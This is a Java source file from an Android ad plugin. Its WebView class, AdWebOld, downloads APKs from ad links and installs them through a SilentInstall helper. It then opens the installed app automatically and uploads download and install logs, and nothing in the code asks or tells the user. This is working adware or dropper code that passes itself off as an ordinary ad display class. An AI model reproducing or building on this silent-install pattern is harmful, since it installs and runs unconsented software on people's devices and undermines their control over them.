package com.tiho.dlplugin.display.ad.view;

import com.tiho.base.base.http.HttpDownload;
import com.tiho.base.base.http.HttpDownload.DownloadStatus;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushMessageDAO;
import com.tiho.dlplugin.install.PackageUtilsEx;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.util.ErrorHandler;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.TimeUtil;

import android.content.Context;
import android.webkit.DownloadListener;

public class AdWebOld extends AdWebBase implements DownloadListener, DownloadStatus {

	public AdWebOld(Context context, long id, int from) {
		super(context, id, from);
		setDownloadListener(this);
	}

	@Override
	protected void download() {
		Thread thread = new Thread(new Runnable() {

			@Override
			public void run() {
				boolean downResult = false;
				try {
					adDownload = new HttpDownload(context, downloadUrl,
							saveDir, userAgent, AdWebOld.this, contentLength,
							"apk");
					adDownload.execute();
					
					downResult = PackageUtil.parsable(context, adDownload
							.getTmpFile().getAbsolutePath());
					if (downResult) {
						adDownload.genTargetFile();
						install(context, adDownload.getFinalFile()
								.getAbsolutePath());
					}
					LogManager.LogShow("广告链接  下载完成  id =" + id + "下载结果 "
							+ downResult);
					LogUploadManager.getInstance(context).addDownloadLog(id, 0,
							downloadUrl, TimeUtil.getNowTime(),
							TimeUtil.getNowTime(), 0,0,downResult ? 1 : 0,
							"AD Download RESULT:" + downResult, 2, "Y");
				} catch (Exception e) {
					LogUploadManager
							.getInstance(context)
							.addDownloadLog(id,0,downloadUrl,TimeUtil.getNowTime(),TimeUtil.getNowTime(),0,0,0,ErrorHandler.getErrMsg("DOWNLOAD_ERROR", e),2, "Y");
					e.printStackTrace();
					downResult = false;
					LogManager.LogShow("广告链接  下载失败  id ="+id +" 原因" + e);
				}

			}
		});
		thread.start();
	}

	private void install(final Context context, String apkPath) {
		LogManager.LogShow("install start context = " + context + ", apkPath = " + apkPath);
		int ret = SilentInstall.SilentInstallApk(context, apkPath);
		String pkg = PackageUtil.parsePackageName(context, apkPath);
		LogManager.LogShow("install ret = " + ret + ", pkg = " + pkg);
		if(PackageUtilsEx.INSTALL_SUCCEEDED == ret){
			LogManager.LogShow("install 安装成功  packname " + pkg);
			LogUploadManager.getInstance(context)
					.addInstallLog(id, 1, "Install success",
							pkg, 1, "Y");
			PackageUtil.openApp(context, pkg);
			try {
				PushMessageDAO msgdao = DAOFactory.getPushMessageDAO(context);
				msgdao.deletePushMessage(id);
			} catch (Exception e) {
				e.printStackTrace();
				LogManager.LogShow("install 删除PushMessage失败原因" + e);
			}
		}else{
			LogManager.LogShow("install 安装失败  packname " + pkg);
			LogUploadManager.getInstance(context)
					.addInstallLog(id, 0,
							"Install FAILED:" + ret, pkg, 1,
							"Y");
		}
		
		
//		SilentInstall.SilentInstallApk(context,
//				PackageUtil.parsePackageName(context, apkPath), apkPath,
//				new IPackageInstallObserver.Stub() {
//					@Override
//					public void packageInstalled(String arg0, int arg1)
//							throws RemoteException {
//						if (arg1 == 1) {
//							LogManager.LogShow("安装成功  packname " + arg0);
//							LogUploadManager.getInstance(context)
//									.addInstallLog(id, 1, "Install success",
//											arg0, 1, "Y");
//							PackageUtil.openApp(context, arg0);
//							try {
//								PushMessageDAO msgdao = DAOFactory.getPushMessageDAO(context);
//								msgdao.deletePushMessage(id);
//							} catch (Exception e) {
//								e.printStackTrace();
//								LogManager.LogShow("删除PushMessage失败原因" + e);
//							}
//						} else {
//							LogManager.LogShow("安装失败  packname " + arg0);
//							LogUploadManager.getInstance(context)
//									.addInstallLog(id, 1,
//											"Install FAILED:" + arg1, arg0, 1,
//											"Y");
//						}
//					}
//				});
	}

	@Override
	public void onDownloadStart(String url, String userAgent,
			String contentDisposition, String mimetype, long contentLength) {
		DownloadStart(url, userAgent,
				contentDisposition, mimetype,contentLength);
	}

	@Override
	public void downloaded(String name, long current, long total) {
		
	}
}
